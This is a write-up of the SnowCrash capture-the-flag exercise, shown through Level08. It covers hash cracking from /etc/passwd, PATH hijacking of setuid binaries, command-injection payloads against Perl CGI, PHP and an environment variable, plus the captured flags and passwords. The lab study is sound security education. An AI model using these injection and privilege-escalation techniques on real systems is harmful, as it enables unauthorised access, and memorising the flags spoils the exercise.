# snowcrash-writeup
This project aims to make you discover, through several little challenges, cyber security in various fields.

## Level00:

```bash
level00@SnowCrash:~$ ls -l /usr/sbin/ | grep flag00
----r--r--  1 flag00  flag00      15 Mar  5  2016 john
```
```bash
level00@SnowCrash:~$ cat /usr/sbin/john
cdiiddwpgswtgt
level00@SnowCrash:~$
```
ROT11: 

<img width="489" alt="image" src="https://user-images.githubusercontent.com/48088579/148955037-fe8cbff0-538f-4c38-b254-9c58efa00a20.png">

Password for flag00: `nottoohardhere`

Flag: `x24ti5gi3x0ol2eh4esiuxias`

## Level01:

```bash
level01@SnowCrash:~$ cat /etc/passwd
...
flag01:42hDRfypTqqnw:3001:3001::/home/flag/flag01:/bin/bash
...
```
```bash
➜  ~ echo "42hDRfypTqqnw" > hash && john hash
Loaded 1 password hash (descrypt, traditional crypt(3) [DES 128/128 SSE2-16])
Press 'q' or Ctrl-C to abort, almost any other key for status
abcdefg          (?)
1g 0:00:00:00 100% 2/3 33.33g/s 25600p/s 25600c/s 25600C/s raquel..bigman
Use the "--show" option to display all of the cracked passwords reliably
Session completed
➜  ~
```

Password for flag01: `abcdefg`

Flag: `f2av5il02puano7naaf6adaaf`

## Level02:
```bash
level02@SnowCrash:~$ ls -l
total 12
----r--r-- 1 flag02 level02 8302 Aug 30  2015 level02.pcap
level02@SnowCrash:~$
```

TCP Stream:

<img width="691" alt="image" src="https://user-images.githubusercontent.com/48088579/148960536-2c6ce7ee-c4f2-4c5a-a2b9-9eceafa8bb38.png">

Password as Hex:

```
66 74 5f 77 61 6e 64 72 7f 7f 7f 4e 44 52 65 6c 7f 4c 30 4c 0d
```

Filtering the password: if `7f` is `DEL` and `0D` is `CR` the password will be `66 74 5F 77 61 4E 44 52 65 4C 30 4C`.

Password for flag02: `ft_waNDReL0L`

Flag: `kooda2puivaav1idi4f57q8iq`

## Level03:

```bash
level03@SnowCrash:~$ ls -l
total 12
-rwsr-sr-x 1 flag03 level03 8627 Mar  5  2016 level03
level03@SnowCrash:~$ ./level03
Exploit me
level03@SnowCrash:~$
```

Disassembled:

<img width="468" alt="image" src="https://user-images.githubusercontent.com/48088579/148961769-ff778941-e677-4280-b940-a7ffee264ccb.png">

Exploit:

```bash
echo "/bin/bash" > /tmp/echo && chmod 777 /tmp/echo && export PATH=/tmp:$PATH && ./level03
```

Flag: `qi0maab88jeaj46qoumi7maus`

## Level04:

```bash
level04@SnowCrash:~$ ls -l
total 4
-rwsr-sr-x 1 flag04 level04 152 Mar  5  2016 level04.pl
level04@SnowCrash:~$
```

```perl
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```

Vulnerability: Command injection in ```print `echo $y 2>&1`;```

Exploit:

```bash
level04@SnowCrash:~$ curl http://localhost:4747/?x=%60getflag%60
Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
level04@SnowCrash:~$
```

Flag: `ne2searoevaevoem4ov4ar8ap`

## Level05:

```bash
level05@SnowCrash:~$ ls -l /usr/sbin/ | grep flag05
-rwxr-x---+ 1 flag05  flag05      94 Mar  5  2016 openarenaserver
level05@SnowCrash:~$
```

```bash
level05@SnowCrash:~$ cat /usr/sbin/openarenaserver
#!/bin/sh

for i in /opt/openarenaserver/* ; do
        (ulimit -t 5; bash -x "$i")
        rm -f "$i"
done
level05@SnowCrash:~$
```

Flag `-x` will check if the file is executable, in that case it will execute it.

Exploit:

```bash
echo "getflag > /opt/openarenaserver/flag" > /opt/openarenaserver/exploit && chmod +x /opt/openarenaserver/exploit && while true; do cat /opt/openarenaserver/flag 2>/dev/null;done
```

Flag: `viuaaale9huek52boumoomioc`

## Level06:

```bash
level06@SnowCrash:~$ ls -l
total 12
-rwsr-x---+ 1 flag06 level06 7503 Aug 30  2015 level06
-rwxr-x---  1 flag06 level06  356 Mar  5  2016 level06.php
level06@SnowCrash:~$
```

Level06.php:

```php
<?php
function y($m)
{
    $m = preg_replace("/\./", " x ", $m);
    $m = preg_replace("/@/", " y", $m);
    return $m;
}
function x($y, $z)
{
    $a = file_get_contents($y);
    $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
    $a = preg_replace("/\[/", "(", $a);
    $a = preg_replace("/\]/", ")", $a);
    return $a;
}
$r = x($argv[1], $argv[2]);
print $r;
?>
```

Binary disassembled:

<img width="523" alt="image" src="https://user-images.githubusercontent.com/48088579/148983240-a24822e3-b1df-4019-8660-50d36d4857df.png">

Exploit:

```bash
echo \[x \$\{\`getflag\`\}\] > /tmp/exploit && ./level06 /tmp/exploit
```

Vulnerability: Command Injection in `$a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);`.

Flag: `wiok45aaoguiboiki2tuin6ub`

## Level07:

```bash
level07@SnowCrash:~$ ls -l
total 12
-rwsr-sr-x 1 flag07 level07 8805 Mar  5  2016 level07
level07@SnowCrash:~$
```

Disassembled:

<img width="494" alt="image" src="https://user-images.githubusercontent.com/48088579/148986606-f28d17d6-70aa-471f-aa4d-9ead57f1a5f2.png">

Vulnerability: Command Injection via `LOGNAME` env variable.

Exploit:

```bash
export LOGNAME='""; getflag' && ./level07
```

Flag: `fiumuikeil55xe9cu4dood66h`

## Level08:

```bash
level08@SnowCrash:~$ ls -l
total 16
-rwsr-s---+ 1 flag08 level08 8617 Mar  5  2016 level08
-rw-------  1 flag08 flag08    26 Mar  5  2016 token
level08@SnowCrash:~$
```

Level08 disassembled:

<img width="945" alt="image" src="https://user-images.githubusercontent.com/48088579/148987582-6afaf0c7-cd4f-4975-bf56-f6c44a412473.png">
